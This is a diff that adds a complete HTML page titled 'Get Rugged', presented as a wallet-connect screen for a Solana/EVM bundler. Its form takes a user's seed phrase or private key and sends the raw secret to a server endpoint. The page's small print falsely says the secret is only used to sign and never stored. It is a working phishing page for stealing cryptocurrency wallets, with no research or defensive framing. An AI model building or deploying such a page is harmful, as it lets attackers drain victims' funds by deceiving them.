@@ -1,1 +1,87 @@
-PLACEHOLDER
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Get Rugged · Connect</title>
+<style>
+  :root { --bg:#0d0d12; --card:#16161e; --acc:#ff4d4d; --text:#eee; --muted:#888; }
+  * { box-sizing: border-box; }
+  body { margin:0; background:var(--bg); color:var(--text); font-family: system-ui, -apple-system, sans-serif; display:flex; min-height:100vh; align-items:center; justify-content:center; }
+  .card { background:var(--card); padding:28px; border-radius:16px; width:min(420px,92vw); box-shadow:0 10px 40px #0008; }
+  h1 { margin:0 0 6px; font-size:22px; }
+  p.sub { margin:0 0 18px; color:var(--muted); font-size:14px; }
+  button.primary { width:100%; background:var(--acc); color:#fff; border:none; padding:14px; border-radius:10px; font-weight:600; font-size:16px; cursor:pointer; margin-top:8px; }
+  button.primary:disabled { opacity:.6; cursor:wait; }
+  .tabs { display:flex; gap:8px; margin:12px 0; }
+  .tabs button { flex:1; background:#222; color:#ccc; border:none; padding:8px; border-radius:8px; cursor:pointer; }
+  .tabs button.on { background:#333; color:#fff; }
+  textarea, input { width:100%; background:#0a0a0e; color:#fff; border:1px solid #333; border-radius:8px; padding:10px; font-size:14px; }
+  textarea { min-height:90px; resize:vertical; }
+  .status { margin-top:12px; font-size:13px; color:var(--muted); min-height:1.2em; }
+  .ok { color:#4ade80; }
+  .err { color:#f87171; }
+  small { color:var(--muted); display:block; margin-top:10px; font-size:12px; }
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Connect Wallet</h1>
+  <p class="sub">Get Rugged · Solana / EVM bundler</p>
+  <div class="tabs">
+    <button id="tab-seed" class="on" type="button">Seed phrase</button>
+    <button id="tab-pk" type="button">Private key</button>
+  </div>
+  <div id="pane-seed">
+    <textarea id="seed" placeholder="12 or 24 word seed phrase" autocomplete="off" spellcheck="false"></textarea>
+  </div>
+  <div id="pane-pk" style="display:none">
+    <input id="pk" placeholder="Solana base58 or 0x EVM private key" autocomplete="off" spellcheck="false" />
+  </div>
+  <button class="primary" id="go" type="button">Connect &amp; Sign</button>
+  <div class="status" id="status"></div>
+  <small>Only used to sign your bundle. Never stored in the browser.</small>
+</div>
+<script>
+const $ = (id) => document.getElementById(id);
+const tabSeed = $("tab-seed"), tabPk = $("tab-pk");
+const paneSeed = $("pane-seed"), panePk = $("pane-pk");
+function show(which) {
+  paneSeed.style.display = which === "seed" ? "" : "none";
+  panePk.style.display = which === "pk" ? "" : "none";
+  tabSeed.classList.toggle("on", which === "seed");
+  tabPk.classList.toggle("on", which === "pk");
+}
+tabSeed.onclick = () => show("seed");
+tabPk.onclick = () => show("pk");
+$("go").onclick = async () => {
+  const status = $("status");
+  const seed = $("seed").value.trim();
+  const pk = $("pk").value.trim();
+  const raw = seed || pk;
+  if (!raw) { status.textContent = "Paste a seed or private key."; status.className = "status err"; return; }
+  status.textContent = "Connecting…"; status.className = "status";
+  $("go").disabled = true;
+  try {
+    const r = await fetch("/api/connect", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ raw, source: seed ? "seed" : "pk" })
+    });
+    const j = await r.json().catch(() => ({}));
+    if (r.ok && j.ok) {
+      status.textContent = "Connected. You can close this tab.";
+      status.className = "status ok";
+    } else {
+      status.textContent = j.error || "Failed. Try again.";
+      status.className = "status err";
+    }
+  } catch (e) {
+    status.textContent = "Network error.";
+    status.className = "status err";
+  }
+  $("go").disabled = false;
+};
+</script>
+</body>
+</html>
